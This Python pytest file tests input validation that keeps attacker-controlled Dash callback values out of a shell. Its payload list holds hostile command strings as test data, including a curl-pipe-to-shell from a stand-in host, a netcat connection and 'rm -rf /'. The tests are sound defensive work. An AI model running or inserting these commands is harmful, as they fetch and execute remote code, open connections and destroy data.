"""Guards for the Agent Control tab's process launching.

Dash callbacks are ordinary HTTP endpoints, so every ``State`` value reaching
``open_terminal_with_command`` is attacker-controlled. These tests pin the
validation that keeps such values out of a shell.
"""

import pytest

from src.gui.tabs.control import _coerce_batch_size, _validate_args

INJECTION_PAYLOADS = [
    "1; touch /tmp/pwned",
    "1 && curl http://evil.test | sh",
    "1 | nc evil.test 4444",
    "$(id)",
    "`id`",
    "1\nrm -rf /",
    "1 > /etc/passwd",
    "a b",            # bare space would split into an extra argv element
    "'quoted'",
    '"quoted"',
]


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
def test_validate_args_rejects_shell_metacharacters(payload):
    with pytest.raises(ValueError):
        _validate_args([payload])


@pytest.mark.parametrize(
    "args",
    [
        [],
        ["--quick"],
        ["--batch-size", "50"],
        ["--interval", "300"],
        ["--skip-quality", "--skip-content"],
        ["--path", "/app/scripts/run.sh"],
    ],
)
def test_validate_args_accepts_legitimate_flags(args):
    assert _validate_args(args) == args


def test_validate_args_stringifies_and_handles_none():
    assert _validate_args(None) == []
    assert _validate_args([50]) == ["50"]


@pytest.mark.parametrize(
    "raw,expected",
    [
        (50, 50),
        ("100", 100),
        (None, 50),           # default
        ("; rm -rf /", 50),   # non-numeric falls back instead of propagating
        (0, 1),               # clamped to minimum
        (999999, 10000),      # clamped to maximum
        (-5, 1),
    ],
)
def test_coerce_batch_size(raw, expected):
    assert _coerce_batch_size(raw) == expected


def test_coerced_batch_size_always_passes_validation():
    """The two guards compose: whatever the client sends survives as a safe argv."""
    for payload in INJECTION_PAYLOADS + [None, 50, "50"]:
        safe = str(_coerce_batch_size(payload))
        assert _validate_args(["--batch-size", safe]) == ["--batch-size", safe]
